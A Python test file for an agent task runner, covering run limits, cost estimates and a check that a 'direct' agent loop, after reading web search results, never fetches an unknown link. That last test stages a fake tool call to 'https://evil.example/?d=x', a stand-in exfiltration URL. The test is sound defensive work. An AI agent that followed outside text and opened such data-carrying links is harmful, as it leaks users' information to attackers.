import json
from datetime import datetime
from decimal import Decimal

from server.agent.adapters import FakeAdapter, Reply, ToolCall
from server.agent.adapters.base import Usage
from server.config import ModelConfig, Price
from server.loops.agent_task import agent_task_body
from server.loops.runner import estimate_cost, run_task
from server.loops.tasks import RunLimits, ScheduledTask, TaskStore
from server.store.db import Db
from server.web.providers import Page

NOW = datetime(2031, 4, 5, 12, 0)


def test_summariser_calls_count_against_the_run(ctx, monkeypatch):
    import server.toolkits.core.web as w

    small = ModelConfig(provider="openai", model="small-model")
    ctx.config = ctx.config.model_copy(update={"flags": {"web_search": True}, "models": {"small": small}})
    summarised = []
    monkeypatch.setattr(w, "fetch_page", lambda url, summarise=None: summarised.append(summarise("long")) or
                        Page(url=url, title="p", text="t", published=None, truncated=True))
    monkeypatch.setattr("server.agent.adapters.build_adapter", lambda model: FakeAdapter([Reply(text="short")] * 3))
    db = Db(ctx.config.db_path, ctx.config.user_id)
    s = TaskStore(db)
    task = ScheduledTask(name="t", kind="agent", trigger={"type": "interval", "minutes": 60}, brief="read",
                         created_by="ka", limits=RunLimits(model_calls=2))
    tid = s.add(task, NOW)
    ctx.db = db
    replies = [Reply(tool_calls=[ToolCall("1", "fetch_page", json.dumps({"url": "https://news.example/a"}))]), Reply(text="done")]
    run_id = run_task(s.get(tid), db, lambda t, rc: agent_task_body(t, rc, ctx, FakeAdapter(replies), NOW), NOW)
    run = next(r for r in s.runs(tid) if r.id == run_id)
    assert run.status == "stopped" and "model_calls" in run.reason


def test_unknown_model_costs_at_highest_price():
    prices = {"a": Price(input_per_m=Decimal(1), output_per_m=Decimal(2)),
              "b": Price(input_per_m=Decimal(5), output_per_m=Decimal(10))}
    usage = Usage(1_000_000, 1_000_000)
    assert estimate_cost(prices, "mystery", usage) == Decimal(15)
    assert estimate_cost(prices, "a", usage) == Decimal(3)
    assert estimate_cost({}, "a", usage) is None


def test_direct_loop_never_opens_an_unknown_link_after_outside_text(ctx, monkeypatch):
    import server.toolkits.core.web as w
    from server.web.providers import SearchResult

    ctx.config = ctx.config.model_copy(update={"flags": {"web_search": True}})
    fetched = []
    monkeypatch.setattr(w, "web_search", lambda q, n: [SearchResult(title="t", url="https://news.example/a", snippet="s",
                                                                       published=None, source="t")])
    monkeypatch.setattr(w, "fetch_page", lambda url, summarise=None: fetched.append(url) or
                        Page(url=url, title="p", text="t", published=None, truncated=False))
    db = Db(ctx.config.db_path, ctx.config.user_id)
    s = TaskStore(db)
    tid = s.add(ScheduledTask(name="t", kind="agent", trigger={"type": "interval", "minutes": 60}, brief="news",
                              created_by="ka", mode="direct"), NOW)
    ctx.db = db
    replies = [Reply(tool_calls=[ToolCall("1", "web_search", json.dumps({"query": "news"}))]),
               Reply(tool_calls=[ToolCall("2", "fetch_page", json.dumps({"url": "https://evil.example/?d=x"}))]),
               Reply(text="done")]
    run_task(s.get(tid), db, lambda t, rc: agent_task_body(t, rc, ctx, FakeAdapter(replies), NOW), NOW)
    assert fetched == []
